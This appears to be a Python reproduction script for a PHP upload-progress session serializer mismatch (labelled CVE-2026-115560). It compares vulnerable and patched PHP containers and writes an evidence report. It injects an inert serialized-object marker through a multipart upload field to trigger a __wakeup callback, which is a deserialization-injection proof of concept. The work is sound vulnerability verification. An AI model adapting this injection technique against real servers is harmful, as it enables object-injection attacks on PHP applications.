#!/usr/bin/env python3
"""Local multipart session serializer mismatch reproduction."""

from __future__ import annotations

import base64
import datetime
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ARTIFACTS = ROOT / "artifacts" / "cve-2026-115560"
PROFILE = "session-mismatch-lab"
SESSION_ID = "lab115560"
PROGRESS_VALUE = 'lab|O:9:"LabMarker":0:{}|'
OBJECT_MARKER = b'|O:9:"LabMarker":0:{}|'

CASES = {
    "session-mismatch-vulnerable": {
        "version": "8.5.12",
        "directory": ARTIFACTS / "vulnerable",
        "port": 8080,
        "enabled": "1",
        "expected_guard": "RUNTIME_CHANGE=ALLOWED",
        "expected_serializer_after": "php",
        "expected_reader_session_ok": False,
        "expected_reader_file_exists": False,
        "expected_decode_rejected": True,
        "expected_wakeup": True,
    },
    "session-mismatch-patched": {
        "version": "8.5.13",
        "directory": ARTIFACTS / "patched",
        "port": 8081,
        "enabled": "0",
        "expected_guard": "RUNTIME_CHANGE=BLOCKED",
        "expected_serializer_after": "php_serialize",
        "expected_reader_session_ok": True,
        "expected_reader_file_exists": True,
        "expected_decode_rejected": False,
        "expected_wakeup": False,
    },
}


def run(command, *, show=True):
    command = list(map(str, command))
    if show:
        print("\n$", " ".join(command), flush=True)

    result = subprocess.run(
        command,
        cwd=ROOT,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    if show and result.stdout:
        print(result.stdout, end="", flush=True)
    if show and result.stderr:
        print(result.stderr, end="", file=sys.stderr, flush=True)

    return result


def compose(*args, show=True):
    return run(
        ["docker", "compose", "--profile", PROFILE, *args],
        show=show,
    )


def prepare_directories():
    ARTIFACTS.mkdir(parents=True, exist_ok=True)

    for case in CASES.values():
        path = case["directory"].resolve()

        if ARTIFACTS.resolve() not in path.parents:
            raise RuntimeError("Refusing to clean outside CVE artifacts")

        path.mkdir(parents=True, mode=0o777, exist_ok=True)
        path.chmod(0o777)

        # Preserve the directory inode used by Docker bind mounts.
        for entry in path.iterdir():
            if entry.is_dir() and not entry.is_symlink():
                shutil.rmtree(entry)
            else:
                entry.unlink()


def image_identity(image):
    result = run(
        ["docker", "image", "inspect", image, "--format", "{{.Id}}"],
        show=False,
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"Cannot inspect image {image}: {result.stderr}"
        )
    return result.stdout.strip()


def run_probe(port):
    return compose(
        "run", "--rm", "--no-deps", "-T",
        "session-mismatch-probe",
        "/lab/cve_2026_115560_probe.py",
        "session-mismatch-nginx",
        str(port),
        SESSION_ID,
        PROGRESS_VALUE,
    )


def read_session_file(service):
    php = (
        '$p="/sessions/sess_lab115560";'
        'if (!is_file($p)) { echo "SESSION_ABSENT\\n"; }'
        'else { $d=file_get_contents($p);'
        'if ($d===false) { fwrite(STDERR,"SESSION_READ_FAILED\\n"); exit(2); }'
        'echo "SESSION_B64=".base64_encode($d)."\\n"; }'
    )

    result = compose(
        "exec", "-T", "--user", "www-data",
        service, "php", "-r", php,
        show=False,
    )

    if result.returncode != 0:
        raise RuntimeError(
            f"Cannot read session inside {service}: {result.stderr}"
        )

    if "SESSION_ABSENT" in result.stdout:
        return None

    encoded = next(
        (
            line.split("=", 1)[1]
            for line in result.stdout.splitlines()
            if line.startswith("SESSION_B64=")
        ),
        None,
    )

    if encoded is None:
        raise RuntimeError(
            f"Session inspection returned no data: {result.stdout!r}"
        )

    return base64.b64decode(encoded, validate=True)


def run_reader(service):
    return compose(
        "exec", "-T", "--user", "www-data", service,
        "php",
        "-d", "session.serialize_handler=php",
        "-d", "session.upload_progress.enabled=0",
        "-d", "session.use_cookies=0",
        "-d", "session.use_strict_mode=0",
        "/var/www/html/read.php",
    )


def run_runtime_guard(service):
    return compose(
        "exec", "-T", service,
        "php",
        "-d", "session.upload_progress.enabled=1",
        "-d", "session.serialize_handler=php_serialize",
        "/var/www/html/runtime_guard.php",
    )


def validate_session_mounts():
    for service in CASES:
        marker = ".cve_2026_115560_mount_check"
        command = (
            "su -s /bin/sh www-data -c "
            "'touch /sessions/" + marker +
            " && rm -f /sessions/" + marker +
            " && echo FPM_USER_WRITE_OK'"
        )
        result = compose(
            "exec", "-T", service, "sh", "-lc", command,
            show=False,
        )

        if result.returncode != 0 or "FPM_USER_WRITE_OK" not in result.stdout:
            raise RuntimeError(
                f"Session mount is not writable by PHP-FPM in {service}: "
                f"{result.stdout} {result.stderr}"
            )

        print(f"{service}: FPM_USER_WRITE_OK")


def run_case(service, case, repetition):
    print(
        f"\n========== {service} / repetition {repetition} ==========",
        flush=True,
    )

    session_path = case["directory"] / ("sess_" + SESSION_ID)
    if session_path.exists():
        session_path.unlink()

    probe = run_probe(case["port"])

    if probe.returncode != 0 or "HTTP_STATUS=200" not in probe.stdout:
        raise RuntimeError("Multipart upload probe did not return HTTP 200")

    if "UPLOAD_SCRIPT_REACHED" not in probe.stdout:
        raise RuntimeError("PHP upload handler was not reached")

    enabled_line = next(
        (
            line.split("=", 1)[1]
            for line in probe.stdout.splitlines()
            if line.startswith("UPLOAD_PROGRESS_ENABLED=")
        ),
        None,
    )

    if enabled_line != case["enabled"]:
        raise RuntimeError(
            f"Unexpected upload-progress setting: {enabled_line!r}; "
            f"expected {case['enabled']!r}"
        )

    if "UPLOAD_SERIALIZER=php_serialize" not in probe.stdout:
        raise RuntimeError("Unexpected writer serializer")

    raw = read_session_file(service)

    marker_in_file = raw is not None and OBJECT_MARKER in raw
    file_size = len(raw) if raw is not None else 0

    print(f"SESSION_FILE_BYTES={file_size}")
    print(f"INJECTED_MARKER_IN_SESSION={marker_in_file}")

    reader = run_reader(service)
    reader_session_ok = "SESSION_START=OK" in reader.stdout
    wakeup = "LAB_MARKER_WAKEUP" in reader.stdout
    reader_session_file_exists = session_path.is_file()

    infrastructure_signatures = (
        "open(/sessions/",
        "Failed to read session data: files (path: /sessions)",
        "Permission denied",
        "No such file or directory",
    )
    reader_diagnostics = reader.stdout + reader.stderr
    reader_decode_rejected = (
        "Failed to decode session object. Session has been destroyed"
        in reader_diagnostics
    )
    reader_infrastructure_error = any(
        signature in reader_diagnostics
        for signature in infrastructure_signatures
    )

    print("READER_OUTPUT_BEGIN")
    print(reader.stdout, end="" if reader.stdout.endswith("\n") else "\n")
    print("READER_OUTPUT_END")

    if reader.stderr:
        print("READER_STDERR_BEGIN")
        print(reader.stderr, end="" if reader.stderr.endswith("\n") else "\n")
        print("READER_STDERR_END")

    print(f"READER_RETURN_CODE={reader.returncode}")
    print(f"READER_SESSION_START_OK={reader_session_ok}")
    print(f"READER_SESSION_FILE_EXISTS={reader_session_file_exists}")
    print(f"WAKEUP_CALLBACK_OBSERVED={wakeup}")
    print(f"READER_INFRASTRUCTURE_ERROR={reader_infrastructure_error}")
    print(f"READER_DECODE_REJECTED={reader_decode_rejected}")

    if case["expected_wakeup"]:
        passed = (
            enabled_line == "1"
            and raw is not None
            and file_size > 0
            and marker_in_file
            and wakeup
            and reader_decode_rejected == case["expected_decode_rejected"]
            and reader_session_ok == case["expected_reader_session_ok"]
            and reader_session_file_exists == case["expected_reader_file_exists"]
            and reader.returncode == 0
            and not reader_infrastructure_error
        )
    else:
        passed = (
            enabled_line == "0"
            and not marker_in_file
            and not wakeup
            and reader_decode_rejected == case["expected_decode_rejected"]
            and reader.returncode == 0
            and reader_session_ok == case["expected_reader_session_ok"]
            and reader_session_file_exists == case["expected_reader_file_exists"]
            and not reader_infrastructure_error
        )

    print("CASE RESULT:", "PASS" if passed else "FAIL")

    return {
        "passed": passed,
        "enabled": enabled_line,
        "file_size": file_size,
        "marker_in_file": marker_in_file,
        "wakeup": wakeup,
        "reader_session_ok": reader_session_ok,
        "reader_session_file_exists": reader_session_file_exists,
        "reader_infrastructure_error": reader_infrastructure_error,
        "reader_decode_rejected": reader_decode_rejected,
    }


def main():
    if not (ROOT / "docker-compose.yml").is_file():
        print("Run from the repository root.", file=sys.stderr)
        return 2

    prepare_directories()

    config = compose("config", "-q")
    if config.returncode != 0:
        return 2

    services = [
        "session-mismatch-vulnerable",
        "session-mismatch-patched",
        "session-mismatch-nginx",
        "session-mismatch-probe",
    ]

    pull = compose("pull", *services)
    if pull.returncode != 0:
        return 2

    up = compose(
        "up", "-d", "--force-recreate",
        "session-mismatch-vulnerable",
        "session-mismatch-patched",
        "session-mismatch-nginx",
    )
    if up.returncode != 0:
        return 2

    try:
        validate_session_mounts()

        identities = {
            "PHP 8.5.12 FPM": image_identity("php:8.5.12-fpm-alpine"),
            "PHP 8.5.13 FPM": image_identity("php:8.5.13-fpm-alpine"),
            "Nginx": image_identity("nginx:1.28-alpine"),
            "Python probe": image_identity("python:3.12-alpine"),
        }

        results = {service: [] for service in CASES}

        for repetition in range(1, 4):
            for service, case in CASES.items():
                results[service].append(
                    run_case(service, case, repetition)
                )

        print("\n========== RUNTIME CONFIGURATION GUARD ==========")

        guards = {}

        for service, case in CASES.items():
            print(f"\n----- PHP {case['version']} -----")
            result = run_runtime_guard(service)

            if result.returncode != 0:
                raise RuntimeError(
                    f"Runtime guard process failed on PHP {case['version']}"
                )

            guards[service] = result.stdout
            print(f"EXPECTED={case['expected_guard']}")

            expected_guard_lines = {
                case["expected_guard"],
                "SERIALIZER_BEFORE=php_serialize",
                "SERIALIZER_AFTER=" + case["expected_serializer_after"],
                "UPLOAD_PROGRESS_ENABLED=1",
            }
            actual_guard_lines = set(result.stdout.splitlines())
            missing = expected_guard_lines - actual_guard_lines

            if missing:
                raise RuntimeError(
                    f"Runtime INI state mismatch on PHP {case['version']}: "
                    f"{sorted(missing)}"
                )

        print("\n========== FINAL RESULTS ==========")

        all_passed = True

        for service, case in CASES.items():
            successful = sum(
                1 for row in results[service] if row["passed"]
            )
            print(
                f"{case['version']}: "
                f"{successful}/3 successful reproductions"
            )
            all_passed = all_passed and successful == 3

        for service, case in CASES.items():
            all_passed = (
                all_passed
                and case["expected_guard"] in guards[service]
            )

        if not all_passed:
            print("INCONCLUSIVE: one or more expected observations failed.")
            return 3

        vulnerable = results["session-mismatch-vulnerable"]
        patched = results["session-mismatch-patched"]

        lines = [
            "# CVE-2026-115560 — Local reproduction evidence",
            "",
            f"Date: {datetime.date.today().isoformat()}",
            "Method: multipart upload-progress session serializer mismatch",
            "",
            "## Runtime image identities",
            "",
        ]

        for name, identity in identities.items():
            lines.append(f"- {name}: `{identity}`")

        lines += [
            "",
            "## Multipart reproduction",
            "",
            "| Runtime | Trials | Upload progress | Marker persisted | Callback | Reader outcome |",
            "|---|---:|---|---:|---:|---|",
            (
                f"| PHP 8.5.12 | {len(vulnerable)} | Enabled | "
                f"{sum(x['marker_in_file'] for x in vulnerable)}/{len(vulnerable)} | "
                f"{sum(x['wakeup'] for x in vulnerable)}/{len(vulnerable)} | "
                f"Decode rejected after callback: "
                f"{sum(x['reader_decode_rejected'] for x in vulnerable)}/{len(vulnerable)} |"
            ),
            (
                f"| PHP 8.5.13 | {len(patched)} | Default Off | "
                f"{sum(x['marker_in_file'] for x in patched)}/{len(patched)} | "
                f"{sum(x['wakeup'] for x in patched)}/{len(patched)} | "
                f"SESSION_START=OK: "
                f"{sum(x['reader_session_ok'] for x in patched)}/{len(patched)} |"
            ),
            "",
            "## Runtime serializer-change guard",
            "",
            "- PHP 8.5.12: runtime change allowed; serializer changed from `php_serialize` to `php`.",
            "- PHP 8.5.13: runtime change blocked; serializer remained `php_serialize`.",
            "",
            "## Interpretation",
            "",
            "The vulnerable writer used php_serialize while the separate reader used php.",
            "A local multipart upload supplied a fixed delimiter and inert object marker",
            "through the upload-progress field. The reader's LabMarker::__wakeup()",
            "callback emitted a fixed marker in all vulnerable trials. The reader then",
            "rejected the malformed session: session_start() returned false and PHP",
            "destroyed the session. The callback therefore ran before full-record",
            "validation; it does not mean the session was successfully restored.",
            "",
            "The patched writer did not persist an upload-progress marker under its",
            "default configuration. Its separate reader started successfully in every",
            "trial and created/read an empty session file.",
            "",
            "The runtime guard allowed the serializer change on PHP 8.5.12 and blocked",
            "it on PHP 8.5.13, leaving the serializer unchanged.",
            "",
            "## Limitations",
            "",
            "This demonstrates the serializer-mismatch and inert object-callback behavior.",
            "It does not use a framework gadget chain, shell command, external callback,",
            "or host target. It does not claim a complete production RCE exploit.",
            "",
            "The fix does not enforce matching serializers across separate applications.",
            "When upload progress is explicitly enabled, all readers and writers sharing",
            "the session store must still use the same serializer.",
            "",
            "Primary advisory:",
            "https://github.com/php/php-src/security/advisories/GHSA-658j-r8rw-q6mx",
            "",
            "Upstream fix:",
            "https://github.com/php/php-src/commit/548bd27949b00bfe01ff38d692dae99cf904b281",
            "",
        ]

        evidence = (
            ROOT / "evidence"
            / "CVE-2026-115560-session-serializer-mismatch.md"
        )
        evidence.parent.mkdir(parents=True, exist_ok=True)
        evidence.write_text("\n".join(lines))

        print(f"\nPASS: evidence written to {evidence.relative_to(ROOT)}")
        return 0

    finally:
        compose(
            "stop",
            "session-mismatch-vulnerable",
            "session-mismatch-patched",
            "session-mismatch-nginx",
            show=False,
        )


if __name__ == "__main__":
    raise SystemExit(main())
